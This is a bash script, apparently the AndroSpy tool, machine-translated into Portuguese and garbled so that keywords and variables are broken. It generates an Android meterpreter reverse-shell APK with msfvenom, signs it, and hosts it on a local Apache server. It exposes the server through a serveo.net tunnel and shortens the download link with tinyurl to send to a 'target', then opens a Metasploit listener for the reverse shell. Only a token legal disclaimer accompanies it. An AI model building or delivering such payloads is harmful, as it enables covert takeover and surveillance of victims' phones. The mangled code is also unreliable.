#! / bin / bash
# Coded By Belahsan Ouerghi (Você não se torna um codificador apenas mudando os créditos, Your R just aa Script Kiddie OwO)
# Time Tunisian Eagles
# Contato: TunisianEagles@protonmail.com
# Programa: www.github.com/TunisianEagles/androspy
# meu Github: www.github.com/TunisianEagles
#  Se você quiser modificar o script, entre em contato comigo fb / ouerghi.belahsan
# Cores
branco = " \ 033 [1; 37m "
cinza = " \ 033 [0; 37m "
roxo = " \ 033 [0; 35m "
vermelho = " \ 033 [1; 31m "
verde = " \ 033 [1; 32m "
amarelo = " \ 033 [1; 33m "
roxo = " \ 033 [0; 35m "
ciano = " \ 033 [0; 36m "
cafe = " \ 033 [0; 33m "
fiuscha = " \ 033 [0; 35m "
azul = " \ 033 [1; 34m "
nc = " \ e [0m "
y = " Y "
n = " n "
e = " ENTER "
# ROOT PRIVILEGIES
se [[ $ EUID  -ne 0]] ;  então
        echo -e " 	$ yellow [!] $ white executar programa como root $ yellow [!] $ nc "
        echo -e " 	$ green Digite $ white sudo ./androspy.sh $ green :) $ nc "
        saída 1
fi
function  readme () {
Claro
echo -e " $ red 		 ▄▄▄ · ▐ · ▄▄▄▄ ▄▄▄ .▄▄ · ▄▄▄ · · ▄▌ "
echo  " 		▐█ ▀█ • █▌▐███▪ ██ ▀▄ █ · ▪ ▐█ ▀. ▐█ ▄█▐█▪██▌ "
echo  " 		▄█▀▀█ ▐█▐▐▌▐█ · ▐█▌▐▀▀▄ ▄█▀▄ ▄▀▀▀█▄ ██▀ · ▐█▌▐█▪ "
echo  " 		▐█ ▪▐▌██▐█▌██. ██ ▐█ • █▌▐█▌.▐▌▐█▄▪▐█▐█▪ · • ▐█▀ ·. "
echo -e " 		 ▀ ▀ ▀▀ █▪▀▀▀▀▀ • .▀ ▀ ▀█▄▀▪ ▀▀▀▀ .▀ ▀ • $ nc "
echo -e " $ cyan         ╔───────────────────────────────────────────── ────────────────────────╗ "
echo -e " $ cyan         | $ white $ yellow   atacar alvos sem consentimento mútuo prévio é ILEGAL.     $ cyan | "
echo -e " $ cyan         | $ white $ yellow Os   desenvolvedores não são responsáveis ​​por quaisquer danos causados ​​por   $ cyan | "
echo -e "   Script $ cyan         | $ white $ yellow .                                                        $ cyan | "
echo -e " $ cyan         | $ white $ red                         MANTENHA-SE LEGAL !!                            $ cyan | "
echo -e " $ cyan         | $ white $ green                     .:.:. Contact.:.:.                          $ cyan | "                          
echo -e " $ cyan         | $ white $ green   Github   $ white : $ blue  	www.github.com/TunisianEagles                     $ cyan | "
echo -e " $ cyan         | $ white $ green   Youtube $ white : $ blue  	https://goo.gl/9x61ys                 		  $ cyan | "
echo -e " $ cyan         | $ white $ green   Site $ white : $ blue     http://tunisianeagles.github.io/                  $ cyan | "
echo -e " $ cyan         | $ white $ green   Email    $ white : $ blue  	TunisianEagles@protonmail.com                     $ cyan | "
echo -e " $ cyan         ╘───────────────────────────────────────────── ────────────────────────╝ $ nc \ n "
echo -e   " $ red [ $ green + $ red ] $ white Pressione $ red [ $ green $ e $ red ] $ white Para continuar ... $ nc "
ler
}
 banner de função () {
Claro
	echo -e " 	\ 033 [0; 36m _______ _ ______ _______ _______ \ 033 [1; 31m _______ _______          
	\ 033 [0; 36m (___) ((/ | (__ \ (____) (___) \ 033 [1; 31m (____ \ (____) | \ / |
	\ 033 [0; 36m | () || \ (|| (\) | () || () | \ 033 [1; 31m | (\ / | () | (\ /)
	\ 033 [0; 36m | (___) || \ | || | ) || (____) || | | | \ 033 [1; 31m | (_____ | (____) | \ (_) /
	\ 033 [0; 36m | ___ || (\ \) || | | || __) | | | | \ 033 [1; 31m (_____) | _____) \ /  
	\ 033 [0; 36m | () || | \ || | ) || (\ (| | | | \ 033 [1; 31m) || () (   
	\ 033 [0; 36m | ) (||) \ || (__ /) | ) \ \ __ | (___) | \ 033 [1; 31m / \ ____) || ) | |   
	\ 033 [0; 36m | / \ || /) _) (______ / | / \ __ / (_______) \ 033 [1; 31m \ _______) | / \ _ / "
	echo -e " \ n \ 033 [0; 36mAutor $ white : \ 033 [1; 32m @ Belahsan_Ouerghi $ nc "
	echo -e " \ n \ e [44m $ red [ $ green ! $ red ] $ white AVISO: Alvos de ataque sem prioridade   $ red [ $ green ! $ red ] $ nc "
	echo -e "       		\ e [101m $ blue [ $ green ! $ blue ] $ white O   consentimento é ilegal e punido por lei.    $ blue [ $ green ! $ blue ] $ nc \ n "
}
 servidor de função () {
sudo serviço apache2 start
whiptail --title " Aviso " --msgbox "                             Olá, mundo !! " 8 78
whiptail --title " Warning " --msgbox "                             Não feche o XTERM " 8 78
	dormir 2
	xterm -T " IP Poisener " -e " ssh -R 80: localhost: 80 ` echo -n $ ( data )  | md5sum | corte -c1-8 ` @ serveo.net 2> / dev / null> link.log "  E
	dormir 7
link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " link.log )
	echo -e "   $ red [ $ green * $ red ] $ yellow Envie o link direto para o destino: $ link / $ payload_name .apk $ nc "
tinyurl = $ ( curl -s http://tinyurl.com/api-create.php ? url = $ link / $ payload_name .apk | head -n1 )
	echo -e "   $ red [ $ green * $ red ] $ yellow Enviar link para o destino usando tinyurl: $ tinyurl $ nc \ n "
	}
função  payload () {
ler -p "   $ ( echo -e $ red [ $ green + $ red ] $ white Enter LHOST :  $ nc ) " lhost
	echo -e "   \ 033 [1; 31mLHOST $ white => $ cyan  $ lhost $ nc "
ler -p "   $ ( echo -e $ red [ $ green + $ red ] $ white Enter LPORT :  $ nc ) " lport
	echo -e "   \ 033 [1; 31mLPORT $ white => $ cyan  $ lport $ nc "
ler -p "   $ ( echo -e $ red [ $ green + $ red ] $ white Insira o nome da carga útil :  $ nc ) " payload_name
	echo -e "   \ 033 [1; 31mPayload Name $ white => $ cyan  $ payload_name $ nc "
msfvenom -p android / meterpreter / reverse_tcp LHOST = $ lhost LPORT = $ lport R >  $ payload_name .apk 2> / dev / null
	echo  " "
	echo -e " $ cyan 			╔───────────────────────────────────────╗ $ nc "
	echo -e " $ cyan 			│ $ nc  $ red [ $ green + $ red ] $ green Carga útil gerada com sucesso $ red [ $ green + $ red ] $ cyan │ $ nc "
	echo -e " $ cyan 			┖───────────────────────────────────────┙ $ nc \ n "
sudo cp -r $ payload_name .apk / var / www / html
	}
 tamanho da função () {
	# Redimensionar Terminal
			resize -s 40 92 > / dev / null
	}
function  cryp () {
# ### Sobre a Cryot, criarei como outras opções ...
leia -p "   $ ( echo -e $ red [ $ green + $ red ] $ white Você quer criptografar a carga $ red [ $ cyan $ payload_name .apk $ red ] $ nc  $ red [ $ green $ y $ white / $ verde $ n $ vermelho ] $ branco  :  $ nc  ) " cripta
if [[ $ crypt  =  " Y " ]] ;  então
echo -e " \ n   $ red [ $ green + $ red ] $ white Payload Encrypter $ blue \ n "
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $ payload_name .apk 
echo -e " \ n   $ red [ $ green + $ red ] $ white Sua carga útil foi criptografada com sucesso $ red [ $ green + $ red ] $ nc \ n "
elif [[ $ crypt  =  " y " ]] ;  então
echo -e " \ n   $ red [ $ green + $ red ] $ white Payload Encrypter $ blue \ n "
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $ payload_name .apk alias_name
echo -e " \ n   $ red [ $ green + $ red ] $ white Sua carga útil foi criptografada com sucesso $ red [ $ green + $ red ] $ nc \ n "
elif [[ $ crypt  =  " sim " ]] ;  então
echo -e " \ n   $ red [ $ green + $ red ] $ white Payload Encrypter $ blue \ n "
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $ payload_name .apk alias_name
echo -e " \ n   $ red [ $ green + $ red ] $ white Sua carga útil foi criptografada com sucesso $ red [ $ green + $ red ] $ nc \ n "
elif [[ $ crypt  =  " SIM " ]] ;  então
echo -e " \ n   $ red [ $ green + $ red ] $ white Payload Encrypter $ blue \ n "
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $ payload_name .apk
echo -e " \ n   $ red [ $ green + $ red ] $ white Sua carga útil foi criptografada com sucesso $ red [ $ green + $ red ] $ nc \ n "
outro
dormir 1
echo -e " \ n   $ red [ $ yellow ! $ red ] $ white Carga útil não criptografada $ red [ $ yellow ! $ red ] $ nc \ n "
fi	
				}
function  listener () {
leia -p "   $ ( echo -e $ red [ $ green + $ red ] $ white Você quer iniciar um ouvinte $ red [ $ green $ y $ white / $ green $ n $ red ] $ white  :  $ nc ) " ouvinte
if [ $ listener  =  " y " ]
então
	echo -e " \ n   $ red [ $ green + $ red ] $ white Iniciando um ouvinte .. $ nc "
	echo -e " usar exploit / multi / handler \ nset PAYLOAD android / meterpreter / reverse_tcp \ nset LHOST $ lhost \ nset LPORT $ lport \ nexploit "  > listener.rc
	echo  " "
msfconsole -r listener.rc
elif [ $ listener  =  " Y " ]
então
	echo -e " \ n   $ red [ $ green + $ red ] $ white Iniciando um ouvinte .. $ nc "
	echo -e " usar exploit / multi / handler \ nset PAYLOAD android / meterpreter / reverse_tcp \ nset LHOST $ lhost \ nset LPORT $ lport \ nexploit "  > listener.rc
	echo  " "
msfconsole -r listener.rc
elif [ $ listener  =  " sim " ]
então
	echo -e " \ n   $ red [ $ green + $ red ] $ white Iniciando um ouvinte .. $ nc "
	echo -e " usar exploit / multi / handler \ nset PAYLOAD android / meterpreter / reverse_tcp \ nset LHOST $ lhost \ nset LPORT $ lport \ nexploit "  > listener.rc
	echo  " "
msfconsole -r listener.rc
elif [ $ listener  =  " Sim " ]
então
	echo -e " \ n   $ red [ $ green + $ red ] $ white Iniciando um ouvinte .. $ nc "
	echo -e " usar exploit / multi / handler \ nset PAYLOAD android / meterpreter / reverse_tcp \ nset LHOST $ lhost \ nset LPORT $ lport \ nexploit "  > listener.rc
	echo  " "
msfconsole -r listener.rc
outro
	echo -e " \ n   $ red [ $ yellow ! $ red ] $ white Programa fechado $ nc \ n "
fi
	}
Tamanho
Leia-me
bandeira
carga útil
criptografia
servidor
ouvinte
